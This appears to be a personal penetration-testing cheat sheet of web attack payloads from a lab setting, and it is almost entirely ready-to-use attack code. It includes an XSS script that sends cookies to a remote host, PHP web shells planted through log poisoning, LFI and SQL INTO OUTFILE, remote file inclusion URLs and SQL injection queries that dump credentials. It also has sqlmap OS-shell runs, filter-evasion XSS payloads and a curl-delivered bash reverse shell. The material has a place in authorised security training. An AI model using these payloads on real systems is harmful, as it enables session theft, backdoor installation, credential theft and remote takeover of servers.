#### XSS
`<iframe src=http://10.11.0.4/report height=”0” width=”0”></iframe>`

`<script>new Image().src="http://10.11.0.4/cool.jpg?output="+document.cookie;</script>`

`powershell -ExecutionPolicy Bypass -File clear_logs.ps1`

`powershell -ExecutionPolicy Bypass -File admin_login.ps1`

### LOG POISONING

```
nc -nv 10.11.0.22 80
(UNKNOWN) [10.11.0.22] 80 (http) open
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>

```
### LFI

`http://10.11.0.22/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig`

### Running a server

`<?php echo shell_exec($_GET['cmd']); ?>`

`python -m SimpleHTTPServer 7331`

`python3 -m http.server 7331`

`php -S 0.0.0.0:8000`

`ruby -run -e httpd . -p 9000`

`busybox httpd -f -p 10000`

### PHP data wrapper used with LFI

`http://192.168.175.10/menu.php?file=data:text/plain,%3C?php%20echo%20shell_exec(%22dir%22)%20?%3E`

`http://192.168.175.10/menu.php?file=data:text/plain,%3C?php%20echo%20%27%3Cpre%3E%27%20.%20shell_exec($_GET[%27cmd%27])%20.%20%27%3C/pre%3E%27;?%3E&cmd=whoami`

### RFI

`http://192.168.175.10/menu2.php?cmd=ipconfig&file=http://192.168.119.175/evil.txt?`

`http://192.168.175.10/menu.php?cmd=ipconfig&file=http://192.168.119.175/evil.txt`

### SQL Injection

```
mysql -u root -proot

jim' or 1=1 limit 1;#


http://10.11.0.22/debug.php?id=1 order by 1

http://10.11.0.22/debug.php?id=1 union all select 1, 2, 3

http://10.11.0.22/debug.php?id=1 union all select 1, 2, @@version 

http://10.11.0.22/debug.php?id=1 union all select 1, 2, user()

http://10.11.0.22/debug.php?id=1 union all select 1, 2, table_name from information_schema.tables

http://10.11.0.22/debug.php?id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'

http://10.11.0.22/debug.php?id=1 union all select 1, username, password from users

http://10.11.0.22/debug.php?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')

http://10.11.0.22/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'

http://192.168.175.10/debug.php?id=1%20union%20all%20select%201,%202,%20%22%3C?php%20echo%20shell_exec($_GET[%27cmd%27]);?%3E%22%20into%20OUTFILE%20%27c:/xampp/htdocs/backdoor.php%27

```
#### sqlmap

```
sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id"

sqlmap -u http://192.168.175.10/debug.php?id=1 -p "id" --dbms=mysql --dump

sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --os- shell

http://192.168.175.10:9090/search?search=gizmo%27)+UNION+ALL+SELECT+1,%27d%27,%27s%27,4,5--

http://192.168.175.10:9090/search?search=gizmo%27)%20union%20select%20null,table_name,user(),4,null%20from%20information_schema.tables--

http://192.168.175.10:9090/search?search=gizmo%27)%20union%20select%20null,column_name,user(),4,null%20from%20information_schema.columns%20--

http://192.168.175.10:9090/search?search=gizmo%27)%20union%20select%20null,concat(username,password),user(),4,null%20from%20users%20--

http://192.168.175.10:9090/search?search=gizmo%27)%20union%20select%20null,concat(username,password),user(),4,null%20from%20users%20--
```

### XSS

```
<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
<svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
<svg/onload=alert('XSS')>
<BODY ONLOAD=alert('XSS')>

https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
```
### curl url encode

```
curl -k --data-urlencode "cmd=/bin/bash -i -c 'bash -i >& /dev/tcp/192.168.119.175/4444 0>&1'" --get https://192.168.175.44/uploads/shell.php -v

```
